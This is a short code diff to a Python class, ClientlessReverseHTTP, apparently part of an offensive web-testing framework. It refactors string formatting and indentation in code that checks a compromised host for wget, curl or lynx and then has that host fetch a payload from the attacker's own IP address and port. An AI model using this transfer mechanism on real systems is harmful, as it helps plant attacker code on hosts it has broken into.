@@ -55,7 +55,7 @@ class ClientlessReverseHTTP(BasePayloadTransfer):
         """
         #    Here i test what remote command we can use to fetch the payload
         for fetcher in ['wget', 'curl', 'lynx']:
-            res = self._exec_method('which ' + fetcher)
+            res = self._exec_method(f'which {fetcher}')
             if res.startswith('/'):
                 #    Almost there...
                 self._command = fetcher
@@ -101,7 +101,7 @@ class ClientlessReverseHTTP(BasePayloadTransfer):
                                   get_temp_dir())
 
         cmd_to_run = cmd_templates[self._command] % \
-            (cf.cf.get('local_ip_address'), self._inbound_port,
+                (cf.cf.get('local_ip_address'), self._inbound_port,
              filename, destination)
         self._exec_method(cmd_to_run)
 
